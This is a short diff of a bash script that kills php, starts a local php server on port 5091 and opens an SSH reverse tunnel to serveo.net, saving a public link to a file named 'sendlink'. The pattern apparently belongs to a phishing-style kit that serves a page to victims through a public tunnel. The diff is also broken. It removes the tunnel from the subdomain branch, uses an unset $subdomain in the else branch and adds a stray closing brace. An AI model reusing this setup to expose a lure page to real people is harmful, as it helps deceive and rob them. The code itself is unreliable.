@@ -101,13 +101,10 @@ killall -2 php > /dev/null 2>&1
 fi
 
 if [[ $subdomain_resp == true ]]; then
-
-$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &
-
 sleep 8
 else
-$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &
-
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:5091 serveo.net 2> /dev/null > sendlink ' &
+}
 sleep 8
 fi
 printf "\e[1;92m[\e[0m\e[1;42m+\e[0m\e[1;92m] Starting php server... (localhost:5091)\e[0m\n"
